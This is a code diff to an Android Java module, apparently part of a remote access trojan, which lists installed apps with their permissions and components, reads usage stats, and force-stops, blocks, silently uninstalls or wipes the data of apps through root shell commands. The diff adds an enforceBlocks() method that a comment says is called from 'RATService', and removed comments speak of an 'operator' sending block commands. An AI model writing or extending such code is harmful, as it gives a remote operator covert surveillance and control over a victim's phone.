@@ -32,7 +32,6 @@ public class AppManagerModule {
     private final ActivityManager activityManager;
     private UsageStatsManager usageStatsManager;
 
-    // Packages the operator has blocked via the block command
     private final Set<String> blockedPackages = new HashSet<>();
 
     public AppManagerModule(Context context) {
@@ -45,7 +44,7 @@ public class AppManagerModule {
         loadBlockedPackages();
     }
 
-    // ── blocked list persistence ──────────────────────────────────────────────
+    // ── Persistence ───────────────────────────────────────────────────────────
 
     private void loadBlockedPackages() {
         SharedPreferences prefs =
@@ -60,11 +59,7 @@ public class AppManagerModule {
         prefs.edit().putStringSet("blocked_packages", new HashSet<>(blockedPackages)).apply();
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    //  LIST INSTALLED APPS
-    //  FIX: removed MATCH_UNINSTALLED_PACKAGES which caused duplicate/missing
-    //       entries; system app filter now works correctly.
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ── List installed apps ───────────────────────────────────────────────────
 
     public String listInstalledApps(boolean includeSystemApps) {
         try {
@@ -76,7 +71,6 @@ public class AppManagerModule {
             for (ApplicationInfo appInfo : allApps) {
                 boolean isSystemApp = (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                 if (!includeSystemApps && isSystemApp) continue;
-
                 appsArray.put(buildAppJson(appInfo, false));
             }
 
@@ -96,9 +90,7 @@ public class AppManagerModule {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    //  APP INFO (detailed)
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ── App info ──────────────────────────────────────────────────────────────
 
     public String getAppInfo(String packageName) {
         try {
@@ -117,7 +109,7 @@ public class AppManagerModule {
         }
     }
 
-    // ── shared JSON builder ───────────────────────────────────────────────────
+    // ── Shared JSON builder ───────────────────────────────────────────────────
 
     private JSONObject buildAppJson(ApplicationInfo appInfo, boolean detailed)
             throws JSONException {
@@ -154,7 +146,6 @@ public class AppManagerModule {
             j.put("sourceDir",        appInfo.sourceDir != null ? appInfo.sourceDir : "");
             j.put("nativeLibraryDir", appInfo.nativeLibraryDir != null ? appInfo.nativeLibraryDir : "");
 
-            // permissions
             JSONArray permissions = new JSONArray();
             try {
                 PackageInfo pi = packageManager.getPackageInfo(
@@ -168,7 +159,6 @@ public class AppManagerModule {
             } catch (Exception ignored) {}
             j.put("permissions", permissions);
 
-            // activities
             JSONArray activities = new JSONArray();
             try {
                 PackageInfo pi = packageManager.getPackageInfo(
@@ -179,7 +169,6 @@ public class AppManagerModule {
             } catch (Exception ignored) {}
             j.put("activities", activities);
 
-            // services
             JSONArray services = new JSONArray();
             try {
                 PackageInfo pi = packageManager.getPackageInfo(
@@ -190,7 +179,6 @@ public class AppManagerModule {
             } catch (Exception ignored) {}
             j.put("services", services);
 
-            // receivers
             JSONArray receivers = new JSONArray();
             try {
                 PackageInfo pi = packageManager.getPackageInfo(
@@ -205,9 +193,7 @@ public class AppManagerModule {
         return j;
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    //  FORCE STOP
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ── Force stop ────────────────────────────────────────────────────────────
 
     public String forceStopApp(String packageName) {
         try {
@@ -224,18 +210,13 @@ public class AppManagerModule {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    //  BLOCK / UNBLOCK
-    //  FIX: actually calls pm disable-user via root; falls back to kill only.
-    //       Nothing is blocked by default anymore.
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ── Block / unblock ───────────────────────────────────────────────────────
 
     public String blockApp(String packageName, boolean block) {
         try {
             if (block) {
                 blockedPackages.add(packageName);
                 saveBlockedPackages();
-                // Try real disable via root; if not rooted, just kill it
                 boolean disabled = tryRoot("pm disable-user --user 0 " + packageName);
                 if (!disabled) activityManager.killBackgroundProcesses(packageName);
                 tryRoot("am force-stop " + packageName);
@@ -257,9 +238,19 @@ public class AppManagerModule {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    //  UNINSTALL
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ── Enforce blocks (call periodically from RATService) ────────────────────
+
+    public void enforceBlocks() {
+        for (String pkg : new HashSet<>(blockedPackages)) {
+            if (isAppRunning(pkg)) {
+                activityManager.killBackgroundProcesses(pkg);
+                tryRoot("am force-stop " + pkg);
+                Log.d(TAG, "Enforced block: " + pkg);
+            }
+        }
+    }
+
+    // ── Uninstall ─────────────────────────────────────────────────────────────
 
     public String uninstallApp(String packageName, boolean silent) {
         try {
@@ -286,9 +277,7 @@ public class AppManagerModule {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    //  USAGE STATS
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ── Usage stats ───────────────────────────────────────────────────────────
 
     public String getAppUsageStats(int days) {
         JSONArray statsArray = new JSONArray();
@@ -354,9 +343,7 @@ public class AppManagerModule {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    //  RUNNING APPS
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ── Running apps ──────────────────────────────────────────────────────────
 
     public String getRunningApps() {
         try {
@@ -396,9 +383,7 @@ public class AppManagerModule {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    //  BLOCKED APPS LIST
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ── Blocked apps list ─────────────────────────────────────────────────────
 
     public String getBlockedApps() {
         try {
@@ -423,9 +408,7 @@ public class AppManagerModule {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    //  CLEAR APP DATA
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ── Clear app data ────────────────────────────────────────────────────────
 
     public String clearAppData(String packageName) {
         try {
@@ -440,9 +423,7 @@ public class AppManagerModule {
         }
     }
 
-    // ═══════════════════════════════════════════════════════════════════════════
-    //  HELPERS
-    // ═══════════════════════════════════════════════════════════════════════════
+    // ── Helpers ───────────────────────────────────────────────────────────────
 
     private boolean isAppEnabled(String packageName) {
         try {
@@ -467,7 +448,6 @@ public class AppManagerModule {
         catch (Exception e) { return "Unknown"; }
     }
 
-    /** Run a shell command via su. Returns true if exit code == 0. */
     private boolean tryRoot(String cmd) {
         try {
             Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
